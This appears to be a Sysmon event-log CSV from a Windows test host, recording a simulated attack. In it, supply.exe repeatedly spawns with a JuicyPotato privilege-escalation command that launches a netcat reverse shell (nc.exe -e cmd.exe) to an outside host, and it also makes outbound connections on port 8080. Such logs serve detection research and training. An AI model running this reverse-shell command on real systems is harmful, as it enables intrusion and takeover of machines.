EventRecordID,TimeCreated.SystemTime,UtcTime,EventID,Computer,Image,CommandLine,ProcessGuid,ProcessId,User,ParentImage,ParentCommandLine,ParentProcessGuid,TargetFilename,QueryName,QueryResults,DestinationIp,DestinationHostname,DestinationPort,SourceIp,SourcePort,Protocol,Initiated,Hashes,CurrentDirectory,Description,Company,Product,Channel,Configuration,ConfigurationFileHash,Contents,Correlation,CreationUtcTime,DestinationIsIpv6,DestinationPortName,Execution.ProcessID,Execution.ThreadID,FileVersion,Hash,IntegrityLevel,Keywords,Level,LogonGuid,LogonId,Opcode,OriginalFileName,ParentProcessId,Provider.Guid,Provider.Name,QueryStatus,RuleName,SchemaVersion,Security.UserID,SourceHostname,SourceIsIpv6,SourcePortName,State,Task,TerminalSessionId,Version,xmlns
2731,2021-05-07T12:31:36.092455Z,2021-05-07 12:31:36.089,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3328-6095-4606-000000001D00,4140,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3327-6095-4206-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,10216,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2732,2021-05-07T12:31:36.132782Z,2021-05-07 12:31:36.119,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3328-6095-4406-000000001D00,640,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI6402\msvcm90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:36.119,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2733,2021-05-07T12:31:36.133371Z,2021-05-07 12:31:36.119,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3328-6095-4406-000000001D00,640,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI6402\msvcp90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:36.119,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2734,2021-05-07T12:31:36.157800Z,2021-05-07 12:31:36.134,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3328-6095-4406-000000001D00,640,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI6402\msvcr90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:36.134,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2735,2021-05-07T12:31:36.157865Z,2021-05-07 12:31:36.149,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3328-6095-4406-000000001D00,640,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI6402\python27.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:36.149,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2736,2021-05-07T12:31:36.169421Z,2021-05-07 12:31:36.167,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3328-6095-4706-000000001D00,3388,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3328-6095-4406-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,640,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2737,2021-05-07T12:31:36.202173Z,2021-05-07 12:31:36.196,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3328-6095-4506-000000001D00,9292,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI92922\msvcm90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:36.196,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2738,2021-05-07T12:31:36.246616Z,2021-05-07 12:31:36.196,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3328-6095-4506-000000001D00,9292,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI92922\msvcp90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:36.196,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2739,2021-05-07T12:31:36.246672Z,2021-05-07 12:31:36.196,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3328-6095-4506-000000001D00,9292,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI92922\msvcr90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:36.196,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2740,2021-05-07T12:31:36.246883Z,2021-05-07 12:31:36.227,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3328-6095-4606-000000001D00,4140,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI41402\msvcm90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:36.227,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2741,2021-05-07T12:31:36.246911Z,2021-05-07 12:31:36.227,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3328-6095-4606-000000001D00,4140,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI41402\msvcp90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:36.227,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2742,2021-05-07T12:31:36.282637Z,2021-05-07 12:31:36.259,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3328-6095-4506-000000001D00,9292,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI92922\python27.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:36.259,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2743,2021-05-07T12:31:36.282733Z,2021-05-07 12:31:36.259,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3328-6095-4606-000000001D00,4140,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI41402\msvcr90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:36.259,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2744,2021-05-07T12:31:36.283514Z,2021-05-07 12:31:36.277,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3328-6095-4806-000000001D00,6140,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3328-6095-4506-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,9292,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2745,2021-05-07T12:31:36.301658Z,2021-05-07 12:31:36.290,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3328-6095-4606-000000001D00,4140,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI41402\python27.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:36.290,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2746,2021-05-07T12:31:36.318881Z,2021-05-07 12:31:36.315,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3328-6095-4906-000000001D00,840,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3328-6095-4606-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,4140,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2747,2021-05-07T12:31:37.086352Z,2021-05-07 12:31:36.036,3,MSEDGEWIN10,C:\Windows\Temp\supply.exe,,747F3D96-3327-6095-4106-000000001D00,10208,MSEDGEWIN10\IEUser,,,,,,,192.168.1.11,-,8080,192.168.1.8,50944,tcp,True,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,,False,-,4224,4216,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,MSEDGEWIN10.domain.name,False,-,,3,,5,http://schemas.microsoft.com/win/2004/08/events/event
2748,2021-05-07T12:31:37.399593Z,2021-05-07 12:31:36.052,3,MSEDGEWIN10,C:\Windows\Temp\supply.exe,,747F3D96-3327-6095-4306-000000001D00,10224,MSEDGEWIN10\IEUser,,,,,,,192.168.1.11,-,8080,192.168.1.8,50945,tcp,True,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,,False,-,4224,4216,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,MSEDGEWIN10.domain.name,False,-,,3,,5,http://schemas.microsoft.com/win/2004/08/events/event
2749,2021-05-07T12:31:37.399621Z,2021-05-07 12:31:36.072,3,MSEDGEWIN10,C:\Windows\Temp\supply.exe,,747F3D96-3327-6095-4206-000000001D00,10216,MSEDGEWIN10\IEUser,,,,,,,192.168.1.11,-,8080,192.168.1.8,50946,tcp,True,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,,False,-,4224,4216,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,MSEDGEWIN10.domain.name,False,-,,3,,5,http://schemas.microsoft.com/win/2004/08/events/event
2750,2021-05-07T12:31:37.400978Z,2021-05-07 12:31:37.337,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3329-6095-4A06-000000001D00,9308,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3328-6095-4906-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,840,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2751,2021-05-07T12:31:37.401643Z,2021-05-07 12:31:37.366,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3329-6095-4B06-000000001D00,9304,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3328-6095-4706-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,3388,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2752,2021-05-07T12:31:37.466001Z,2021-05-07 12:31:37.444,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3329-6095-4C06-000000001D00,9336,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3328-6095-4806-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,6140,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2753,2021-05-07T12:31:37.477945Z,2021-05-07 12:31:37.477,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3329-6095-4A06-000000001D00,9308,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI93082\msvcm90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:37.462,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2754,2021-05-07T12:31:37.498148Z,2021-05-07 12:31:37.493,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3329-6095-4A06-000000001D00,9308,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI93082\msvcp90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:37.493,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2755,2021-05-07T12:31:37.526217Z,2021-05-07 12:31:37.509,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3329-6095-4A06-000000001D00,9308,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI93082\msvcr90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:37.509,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2756,2021-05-07T12:31:37.548566Z,2021-05-07 12:31:37.540,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3329-6095-4A06-000000001D00,9308,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI93082\python27.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:37.540,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2757,2021-05-07T12:31:37.582875Z,2021-05-07 12:31:37.571,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3329-6095-4B06-000000001D00,9304,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI93042\msvcm90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:37.571,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2758,2021-05-07T12:31:37.586912Z,2021-05-07 12:31:37.571,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3329-6095-4B06-000000001D00,9304,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI93042\msvcp90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:37.571,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2759,2021-05-07T12:31:37.604601Z,2021-05-07 12:31:37.601,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3329-6095-4D06-000000001D00,4972,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3329-6095-4A06-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,9308,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2760,2021-05-07T12:31:37.626912Z,2021-05-07 12:31:37.603,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3329-6095-4B06-000000001D00,9304,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI93042\msvcr90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:37.603,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2761,2021-05-07T12:31:37.626970Z,2021-05-07 12:31:37.618,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3329-6095-4B06-000000001D00,9304,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI93042\python27.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:37.618,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2762,2021-05-07T12:31:37.641346Z,2021-05-07 12:31:37.638,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3329-6095-4E06-000000001D00,656,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3329-6095-4B06-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,9304,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2763,2021-05-07T12:31:37.683524Z,2021-05-07 12:31:37.635,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3329-6095-4C06-000000001D00,9336,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI93362\msvcm90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:37.635,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2764,2021-05-07T12:31:37.683580Z,2021-05-07 12:31:37.635,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3329-6095-4C06-000000001D00,9336,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI93362\msvcp90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:37.635,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
